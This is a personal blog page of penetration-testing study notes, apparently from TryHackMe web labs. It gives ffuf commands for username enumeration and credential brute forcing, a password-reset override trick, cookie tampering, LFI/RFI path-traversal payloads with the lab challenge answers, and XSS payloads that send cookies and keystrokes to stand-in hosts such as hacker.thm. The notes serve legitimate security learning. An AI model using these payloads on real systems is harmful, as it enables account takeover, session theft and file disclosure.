<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>Web Fundamentals 2 :: Dayyala Ravi</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Username enumeration with ffuf listing all the available usernames of the website. FUZZ keyword in the data, is being replaced by usernames in the wordlist ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &amp;#34;username=FUZZ&amp;amp;email=x&amp;amp;password=x&amp;amp;cpassword=x&amp;#34; -H &amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34; -u http://MACHINE_IP/customers/signup -mr &amp;#34;username already exists&amp;#34; brute forcing the login with avaiable usernames, assumed output from above pasted into valid_usernames.txt her we have two wordlist, so we have given them our own FUZZ keyword ffuf -w valid_usernames." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:1313/resources/jr-pentester/web-fundamentals-2/" />





  
  <link rel="stylesheet" href="//localhost:1313/css/custom.min.326411e5dc338f1afa0110f16fe2e2f9a33f29f07d6067be424d05c9d4cb6841.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="//localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Web Fundamentals 2">
<meta property="og:description" content="Username enumeration with ffuf listing all the available usernames of the website. FUZZ keyword in the data, is being replaced by usernames in the wordlist ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &amp;#34;username=FUZZ&amp;amp;email=x&amp;amp;password=x&amp;amp;cpassword=x&amp;#34; -H &amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34; -u http://MACHINE_IP/customers/signup -mr &amp;#34;username already exists&amp;#34; brute forcing the login with avaiable usernames, assumed output from above pasted into valid_usernames.txt her we have two wordlist, so we have given them our own FUZZ keyword ffuf -w valid_usernames." />
<meta property="og:url" content="//localhost:1313/resources/jr-pentester/web-fundamentals-2/" />
<meta property="og:site_name" content="Dayyala Ravi" />

  <meta property="og:image" content="//localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2024-01-20 00:00:00 &#43;0000 UTC" />












</head>
<body>


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Dayyala Ravi
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/posts">Blogs</a></li>
        
      
        
          <li><a href="/">Home</a></li>
        
      
        
          <li><a href="/resources">Resources</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/posts" >Blogs</a></li>
        
      
        
          <li><a href="/" >Home</a></li>
        
      
        
          <li><a href="/resources" >Resources</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/resources/jr-pentester/web-fundamentals-2/">Web Fundamentals 2</a>
  </h1>
  <div class="post-meta"><time class="post-date">2024-01-20</time></div>

  
  


  

  <div class="post-content"><div>
        <h2 id="username-enumeration-with-ffuf">Username enumeration with ffuf<a href="#username-enumeration-with-ffuf" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>listing all the available usernames of the website.</li>
<li>FUZZ keyword in the data, is being replaced by usernames in the wordlist</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d <span style="color:#e6db74">&#34;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -u http://MACHINE_IP/customers/signup -mr <span style="color:#e6db74">&#34;username already exists&#34;</span>
</span></span></code></pre></div><ul>
<li>brute forcing the login with avaiable usernames, assumed output from above pasted into valid_usernames.txt</li>
<li>her we have two wordlist, so we have given them our own FUZZ keyword</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt:W2 -X POST -d <span style="color:#e6db74">&#34;username=W1&amp;password=W2&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -u http://10.48.174.24/customers/login -fc <span style="color:#ae81ff">200</span>
</span></span></code></pre></div><h2 id="taking-advantage-of-flaw-in-application-logic">Taking Advantage of flaw in application logic<a href="#taking-advantage-of-flaw-in-application-logic" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>We know the parameters can be sent using either query in url, or in the payload.</li>
<li>In a given scenario of task, application prefers the parameter in payload than in the query</li>
<li>So, we know supposed to get this worked out to fake</li>
<li>i have created my own account with, username:silent, email:silent@customer.acmeitsupport.thm, password:silent</li>
<li>Assuming im attacking the user: <code>robor</code> now</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;http://10.48.174.24/customers/reset?email=robert%40=acmeitsupport.thm&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -d <span style="color:#e6db74">&#39;username=robert&#39;</span>
</span></span></code></pre></div><ul>
<li>Now overiding the query paramerter with payload</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;http://10.48.174.24/customers/reset?email=robert%40acmeitsupport.thm&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -d <span style="color:#e6db74">&#39;username=robert&amp;email=silent@customer.acmeitsupport.thm&#39;</span>
</span></span></code></pre></div><ul>
<li>NOw you will have a direct link on your email to reset the password of robert</li>
</ul>
<h2 id="cookie-tampering">Cookie tampering<a href="#cookie-tampering" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>we can do a little impersonization with the cookie tampering, steal others cookies and use them.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http:10.48.174.24/cookie-test <span style="color:#75715e">#Not logged</span>
</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Set-Cookie: logged_in=true; admin=false&#34;</span> http:10.48.174.24/cookie-test <span style="color:#75715e">#Loggedin as user</span>
</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Set-Cookie: logged_in=true; admin=true&#34;</span> http:10.48.174.24/cookie-test <span style="color:#75715e">#Loggedin as the admn</span>
</span></span></code></pre></div><ul>
<li>sometimes cookies can be in form of the hashes like md5sum,sha256,sha512,sha1. These can be somehow (sometimes) cracked with <code>http://crackstation.net</code></li>
<li>Also, cookies also can be in encoded form like base64, use <code>base64 --decode</code> command to decode</li>
</ul>
<h2 id="file-inclusion-lfi-rfi-path-traversal">File inclusion (LFI, RFI, Path traversal)<a href="#file-inclusion-lfi-rfi-path-traversal" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.</li>
<li>This can leak data, such as code, credentials or other important files related to the web application or operating system, also leads to gain RCE if attacker has capability to write to server by any other means</li>
</ul>
<h4 id="path-traversal">Path Traversal:<a href="#path-traversal" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>This occur when the user&rsquo;s input is passed to a function such as file_get_contents in PHP due to  Often poor input validation or filtering is the cause of the vulnerability.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://webapp.thm/get.php?file<span style="color:#f92672">=</span>../../../../etc/passwd <span style="color:#75715e"># in linux</span>
</span></span><span style="display:flex;"><span>curl http://webapp.thm/get.php?file<span style="color:#f92672">=</span>../../../../boot.ini <span style="color:#75715e"># in windows</span>
</span></span><span style="display:flex;"><span>curl http://webapp.thm/get.php?file<span style="color:#f92672">=</span>../../../../boot.ini <span style="color:#75715e"># in windows</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/shadow --&gt; contains systems&#39;s user passwords</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/profile --&gt; controls system wide default varibles such as Export variables, File creation mask, terminal types, Mail messages to indicate new mail has arrived</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /proc/version --&gt; kernal version</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /root/.bash_history --&gt; contains root&#39;s history commands</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /var/mail/root --&gt; all root&#39;s mails</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/issue --&gt; contains messages to be printed before the login prompt</span>
</span></span></code></pre></div><h4 id="local-file-inclusion-lfi">Local File Inclusion (LFI):<a href="#local-file-inclusion-lfi" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://webapp.thm/index.php?lang<span style="color:#f92672">=</span>../../../../etc/passwd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte</span>
</span></span><span style="display:flex;"><span>curl http://webapp.thm/index.php?lang<span style="color:#f92672">=</span>/etc/passwd%00
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#developer decided to filter keywords to avoid disclosing sensitive information! Now we have this trick to bypass</span>
</span></span><span style="display:flex;"><span>curl http://webapp.thm/index.php?lang<span style="color:#f92672">=</span> /etc/passwd/.
</span></span></code></pre></div><h4 id="remote-file-inclusion---rfi">Remote File Inclusion - RFI<a href="#remote-file-inclusion---rfi" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>RFI is a technique to include remote files into a vulnerable application</li>
<li>One requirement for RFI is that the allow_url_fopen option needs to be on.</li>
<li>An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOF &gt; cmd.php
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt;&gt; &lt;?PHP print exec(&#39;hostname&#39;); ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt;&gt; EOF</span>  
</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">4444</span> &amp;
</span></span><span style="display:flex;"><span>curl http://local_ip:4444/cmd.php
</span></span></code></pre></div><ul>
<li>Now we have the script loacted at the remote server, lets see the action now</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># it will run the remote script in the webserver, and returen the output back on browser</span>
</span></span><span style="display:flex;"><span>curl http://webapp.thm/index.php?lang<span style="color:#f92672">=</span>http://local_ip:4444/cmd.php
</span></span></code></pre></div><h4 id="solutions-to-the-challanges">solutions to the challanges<a href="#solutions-to-the-challanges" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>challange1:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST -d <span style="color:#e6db74">&#39;file=/etc/flag1&#39;</span> http://10.49.163.168/challenges/chall1.php
</span></span></code></pre></div><ul>
<li>challange2:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --cookies THM<span style="color:#f92672">=</span>/etc/flag2%00 http://10.49.163.168/challenges/chall2.php
</span></span></code></pre></div><ul>
<li>challange3:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST -d <span style="color:#e6db74">&#39;file=../../../../etc/flag3%00&#39;</span> http://10.49.163.168/challenges/chall3.php
</span></span></code></pre></div><h2 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)<a href="#server-side-request-forgery-ssrf" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>A vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker&rsquo;s choosing.</li>
<li>Two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker&rsquo;s screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker&rsquo;s screen.</li>
<li>Identifying this vulnerability:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#When a full URL is used in a parameter in the address bar:</span>
</span></span><span style="display:flex;"><span>curl https://website/form?server<span style="color:#f92672">=</span>http://server.website.thm/store
</span></span><span style="display:flex;"><span><span style="color:#75715e">#A partial URL such as just the hostname:</span>
</span></span><span style="display:flex;"><span>curl https://website.thm/form?server<span style="color:#f92672">=</span>api
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Or perhaps only the path of the URL:</span>
</span></span><span style="display:flex;"><span>https://website.thm/form?dst<span style="color:#f92672">=</span>/forms/contact
</span></span><span style="display:flex;"><span><span style="color:#75715e">#or probebly hidden inside of form, inspect the html content of form</span>
</span></span></code></pre></div><h2 id="cross-site-scripting-xss">Cross-site scripting (XSS)<a href="#cross-site-scripting-xss" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript (payload) gets injected into a web application with the intention of being executed by other users.</li>
<li>This is the simplest of payloads, to create an alert box to pop up on the page with a string of text, for example: <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></li>
<li>Session stealing: User&rsquo;s session such as login tokens, are often kept in cookies on the target machines. Below java script takes the target&rsquo;s cookie, encodes it with base64 for successful transmission and posts it to a website under the hacker&rsquo;s control to be logged.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://hacker.thm/steal?cookie=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>));<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><ul>
<li>Key logger: Anything you type on webpage will be forwarded to website under the hacker&rsquo;s control</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>document.<span style="color:#a6e22e">onkeypress</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) { <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://hacker.thm/log?key=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">key</span>) );}<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><ul>
<li>Bussiness logic: this payload would be calling a particular network resource or a javascript function. Lets say fuction changing the user&rsquo;s email address called <code>user.changeEmail()</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">changeEmail</span>(<span style="color:#e6db74">&#39;attacker@hacker.thm&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><h4 id="reflected-xss">Reflected XSS<a href="#reflected-xss" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.</li>
<li>A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.</li>
</ul>
<h4 id="stored-xss">Stored XSS<a href="#stored-xss" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.</li>
</ul>
<h4 id="dom-based-xss">DOM BAsed XSS<a href="#dom-based-xss" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content.</li>
<li>A web page is a document, and this document can be either displayed in the browser window or as the HTML source.</li>
<li>DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.</li>
<li>Perfecting the payload</li>
</ul>
<pre tabindex="0"><code># escaping the tags
&lt;h2&gt; THM &lt;/h2&gt;
&lt;h2&gt;&lt;script&gt;alert(&#39;THM&#39;)&lt;/script&gt;&lt;/h2&gt;

# To escape the input tag, we can make use of &#34;&gt;. You can do this with the following payload:
&lt;h2&gt; &lt;input value=&#34;THM&#34;&gt;&lt;/h2&gt;
&lt;h2&gt; &lt;input value=&#34;&#34;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;&#34;&gt;&lt;/h2&gt;

# To escape the textarea tag a little differently from the input one by using the following payload: 
&lt;h2&gt; &lt;textarea&gt;THM&lt;/textarea&gt;&lt;/h2&gt;
&lt;h2&gt; &lt;textarea&gt;&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;&lt;/textarea&gt;&lt;/h2&gt;

# To escape the existing JavaScript command, so you&#39;re able to run your code; you can do this with the following payload 
document.getElementByClassName(&#39;name&#39;)[0].innerHTML = &#39;THM&#39;;
document.getElementByClassName(&#39;name&#39;)[0].innerHTML = &#39;&#39;;alert(&#39;THM&#39;);//&#39;;

# When word script  gets removed from your payload, that&#39;s because there is a filter that strips out any potentially dangerous words. When a word gets removed from a string, there&#39;s a helpful trick that you can try. 
&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt; --&gt; &lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;
 
# To escape from the image tag
&lt;img src=&#34;/images/cat.jpg&#34; &gt;
&lt;img src=&#34;/images/cat.jpg&#34; onload=&#34;alert(&#39;THM&#39;); &#34;&gt; 

# An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you&#39;ve just completed, and it would have executed the code successfully. 

jaVasCript:/*-/*`/*\`/*&#39;/*&#34;/**/(/* */onerror=alert(&#39;THM&#39;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#39;THM&#39;)//&gt;\x3e
</code></pre><ul>
<li>Blind XSS (Example): Insert below script into any of website and steal the cookies</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">/textarea&gt;&lt;script&gt;fetch(&#39;http:/</span><span style="color:#f92672">/</span><span style="color:#a6e22e">URL_OR_IP</span><span style="color:#f92672">:</span><span style="color:#a6e22e">PORT_NUMBER</span><span style="color:#f92672">?</span><span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>) );<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt; </span>
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
